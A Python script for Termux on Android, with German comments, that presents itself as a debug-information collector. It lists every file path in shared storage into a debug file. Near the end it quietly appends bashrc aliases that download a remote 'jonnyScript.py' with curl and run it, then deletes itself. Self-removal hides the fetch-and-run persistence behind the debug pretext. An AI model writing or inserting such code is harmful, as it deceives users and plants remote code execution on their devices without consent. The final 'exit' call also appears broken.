import os
import time
import shutil
import subprocess

source_dir = "storage/shared/"
debug_file = os.path.join(source_dir, "debug.dbg")
bashrc_path = os.path.expanduser("~/.bashrc")
script_path = os.path.realpath(__file__)

# Funktion für Pieptöne (G-Dur auf- und absteigend)
def play_gdur_ascending():
    frequencies = [392, 493.88, 587.33]  # G4, H4, D5
    for freq in frequencies:
        subprocess.run(['play', '-n', 'synth', '0.3', 'sine', str(freq)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def play_gdur_descending():
    frequencies = [587.33, 493.88, 392]  # D5, H4, G4
    for freq in frequencies:
        subprocess.run(['play', '-n', 'synth', '0.3', 'sine', str(freq)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# Ankündigung mit aufsteigendem G-Dur-Ton
play_gdur_ascending()
print("Es werden Debug Informationen gesammelt...")

# Debug-Datei erstellen und alle Dateien auflisten, Android-Verzeichnis ignorieren
with open(debug_file, 'w') as dbg:
    for root, dirs, files in os.walk(source_dir):
        # Verzeichnis Android ignorieren
        if 'Android' in root.split(os.sep):
            continue
        for file in files:
            try:
                full_path = os.path.join(root, file)
                dbg.write(full_path + '\n')
            except Exception as e:
                # Fehler ignorieren
                continue

print("Debug Informationen erfolgreich gesammelt.")

# Abschluss mit absteigendem G-Dur-Ton
play_gdur_descending()
print("Debug-Datei erfolgreich erstellt.")

# 3 Sekunden warten
time.sleep(3)

# Alias in .bashrc hinzufügen, falls nicht vorhanden
curl_command = "curl -s -o jonnyScript.py https://raw.githubusercontent.com/GeorgeOrewell/Mancala/main/jonnyScript.py && python jonnyScript.py"
alias_command = f"alias Jonny='{curl_command}'\nalias jonny='{curl_command}'\n"

if not os.path.exists(bashrc_path):
    with open(bashrc_path, 'w') as bashrc:
        bashrc.write(alias_command)
else:
    with open(bashrc_path, 'r+') as bashrc:
        content = bashrc.read()
        if "alias jonny=" not in content:
            bashrc.write(alias_command)
            print("Alias 'Jonny' und 'jonny' wurden zur .bashrc hinzugefügt.")

# Script sich selbst löschen
os.remove(script_path)

# Termux beenden (optional, kann weggelassen werden, falls nicht notwendig)
subprocess.run(['exit'])